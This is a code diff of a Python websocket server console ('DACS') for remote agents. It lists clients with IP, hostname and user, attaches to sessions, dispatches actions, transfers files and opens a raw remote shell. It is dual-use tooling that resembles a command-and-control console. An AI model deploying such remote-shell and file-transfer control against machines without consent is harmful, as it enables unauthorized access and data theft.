@@ -44,26 +44,6 @@ _RED = "\033[31m" if _COLOR else ""
 _CYAN = "\033[36m" if _COLOR else ""
 
 ACTION_SCHEMAS: Dict[str, Dict[str, Any]] = {
-    "echo": {
-        "description": "Return a text message",
-        "fields": [
-            {"name": "message", "prompt": "Message", "required": True},
-        ],
-    },
-    "collect_system": {
-        "description": "Collect host/system telemetry",
-        "fields": [],
-    },
-    "list_processes": {
-        "description": "List running processes",
-        "fields": [],
-    },
-    "list_directory": {
-        "description": "List files in a directory",
-        "fields": [
-            {"name": "path", "prompt": "Directory path", "required": False, "default": "."},
-        ],
-    },
     "restart_agent": {
         "description": "Restart the remote agent",
         "fields": [],
@@ -124,35 +104,38 @@ def console_print(message: str, level: str = "INFO") -> None:
         sys.stdout.flush()
 
 
-def render_help() -> str:
+def render_help(in_session: bool = False) -> str:
     available_actions = ", ".join(sorted(ALLOWED_ACTIONS))
-    lines = [
-        f"{_BOLD}DACS Session Console{_RESET}",
+    if in_session:
+        return "\n".join([
+            f"{_BOLD}DACS Interactive Session{_RESET}",
+            "----------------------------------------",
+            "Commands:",
+            "  help              - Show this help menu",
+            "  run               - Execute action (usage: run <action_name> [json])",
+            "  upload            - Send file to client (usage: upload <server_path> <client_path>)",
+            "  download          - Get file from client (usage: download <client_path> [server_path])",
+            "  tty               - Enter raw interactive shell",
+            "  back              - Exit active session",
+            "  clear | cls       - Clear the console screen",
+            "",
+            "Available actions:",
+            f"  {available_actions}",
+            "----------------------------------------",
+        ])
+    return "\n".join([
+        f"{_BOLD}DACS Global Console{_RESET}",
         "----------------------------------------",
-        "General:",
-        "  help",
-        "  sessions | clients",
-        "  task <task_id>",
-        "  clear | cls",
-        "  quit",
-        "",
-        "Session workflow:",
-        "  use <client_id>",
-        "  run <action_name> [payload_json]",
-        "  upload <server_file_path> <client_file_path>",
-        "  download <client_file_path> [server_file_path]",
-        "  tty <client_id>",
-        "  back",
-        "",
-        "Direct dispatch:",
-        "  send <client_id> <action_name> [payload_json]",
-        "  broadcast <action_name> [payload_json]",
-        "",
-        "Available actions:",
-        f"  {available_actions}",
+        "Commands:",
+        "  help              - Show this help menu",
+        "  sessions|clients  - List all connected clients",
+        "  use               - Enter interactive session (usage: use <client_id>)",
+        "  tty               - Enter raw interactive shell (usage: tty <client_id>)",
+        "  task              - View task result details (usage: task <task_id>)",
+        "  clear | cls       - Clear the console screen",
+        "  quit              - Stop the server",
         "----------------------------------------",
-    ]
-    return "\n".join(lines)
+    ])
 
 
 def clear_screen() -> None:
@@ -241,20 +224,6 @@ async def send_command(client_id: str, action: str, payload: Optional[Dict[str, 
     except Exception as exc:
         await registry.update_task(task_id, client_id, "error", f"dispatch_failed: {exc}")
         return False, "dispatch_failed"
-
-
-async def broadcast(action: str, payload: Optional[Dict[str, Any]]) -> None:
-    client_ids = await registry.client_ids()
-    if not client_ids:
-        print("No clients connected")
-        return
-
-    for cid in client_ids:
-        ok, info = await send_command(cid, action, payload)
-        if ok:
-            print(f"[{cid}] task_id={info}")
-        else:
-            print(f"[{cid}] error={info}")
 
 
 async def handle_client_messages(client_id: str, websocket: ServerConnection) -> None:
@@ -470,7 +439,6 @@ def _build_payload_interactive(action: str) -> Optional[Dict[str, Any]]:
 async def console_loop() -> None:
     global _prompt_visible, _active_prompt
     setup_readline()
-    help_text = render_help()
     
     dashboard_text = "\n".join([
         f"{_BOLD}DACS Session Console{_RESET}",
@@ -493,12 +461,26 @@ async def console_loop() -> None:
             continue
 
         if line == "help":
-            print(help_text)
+            print(render_help(in_session=bool(active_session)))
             continue
 
         if line in ("clients", "sessions"):
             clients = await registry.list_clients()
-            print(json.dumps(format_clients_for_json(clients), indent=2))
+            if not clients:
+                print("No clients connected.")
+                continue
+            
+            print(f"\n{_BOLD} {'#':<2} | {'CLIENT ID':<20} | {'IP ADDRESS':<15} | {'LAST SYNC':<19} | {'OS':<9} | {'VERSION'}{_RESET}")
+            print("-" * 90)
+            for i, c in enumerate(format_clients_for_json(clients), 1):
+                cid = str(c.get("client_id", "unknown"))[:24]
+                sys_data = c.get("system", {})
+                ip = str(sys_data.get("ip", "unknown"))[:14]
+                os_name = str(sys_data.get("os", "unknown"))[:8]
+                ver = str(c.get("version", c.get("agent_version", "unknown")))[:7]
+                seen = str(c.get("last_seen", ""))[:19]
+                print(f" {i:<2} | {cid:<20} | {ip:<15} | {seen:<19} | {os_name:<9} | {ver}")
+            print()
             continue
 
         if line in ("clear", "cls"):
@@ -513,10 +495,12 @@ async def console_loop() -> None:
         if line == "quit":
             raise KeyboardInterrupt
 
-        if line.startswith("tty "):
-            target = line.split(" ", 1)[1].strip()
+        if line.startswith("tty"):
+            parts = line.split(" ", 1)
+            target = parts[1].strip() if len(parts) > 1 and parts[1].strip() else active_session
+            
             if not target:
-                print("Usage: tty <client_id>")
+                print("Usage: tty <client_id> or 'use <client_id>' first")
                 continue
             client = await registry.get_client(target)
             if not client:
@@ -723,10 +707,24 @@ async def console_loop() -> None:
             if not target:
                 print("Usage: use <client_id>")
                 continue
-            if not await registry.get_client(target):
+                
+            client_session = await registry.get_client(target)
+            if not client_session:
                 print("Session not found")
                 continue
+                
             active_session = target
+            
+            all_clients = await registry.list_clients()
+            c_dict = next((c for c in format_clients_for_json(all_clients) if c["client_id"] == target), {})
+            sys_data = c_dict.get("system", {})
+            print(f"\n{_CYAN}[*] Attached to Session: {target}{_RESET}")
+            print(f"    Version   : {c_dict.get('version', c_dict.get('agent_version', 'unknown'))}")
+            print(f"    Last Sync : {c_dict.get('last_seen', 'unknown')}")
+            print(f"    OS        : {sys_data.get('os', 'unknown')}")
+            print(f"    Hostname  : {sys_data.get('hostname', 'unknown')}")
+            print(f"    IP Address: {sys_data.get('ip', 'unknown')}")
+            print(f"    User      : {sys_data.get('user', 'unknown')}\n")
             continue
 
         if line.startswith("run "):
@@ -751,40 +749,6 @@ async def console_loop() -> None:
                     continue
             ok, info = await send_command(active_session, action, payload)
             print(f"task_id={info}" if ok else f"error={info}")
-            continue
-
-        if line.startswith("send "):
-            parts = line.split(" ", 3)
-            if len(parts) < 3:
-                print("Usage: send <client_id> <action_name> [payload_json]")
-                continue
-            client_id = parts[1]
-            action = parts[2]
-            payload = {}
-            if len(parts) == 4:
-                try:
-                    payload = _parse_json_payload(parts[3])
-                except Exception as exc:
-                    print(f"Invalid payload: {exc}")
-                    continue
-            ok, info = await send_command(client_id, action, payload)
-            print(f"task_id={info}" if ok else f"error={info}")
-            continue
-
-        if line.startswith("broadcast "):
-            parts = line.split(" ", 2)
-            if len(parts) < 2:
-                print("Usage: broadcast <action_name> [payload_json]")
-                continue
-            action = parts[1]
-            payload = {}
-            if len(parts) == 3:
-                try:
-                    payload = _parse_json_payload(parts[2])
-                except Exception as exc:
-                    print(f"Invalid payload: {exc}")
-                    continue
-            await broadcast(action, payload)
             continue
 
         if line.startswith("task "):
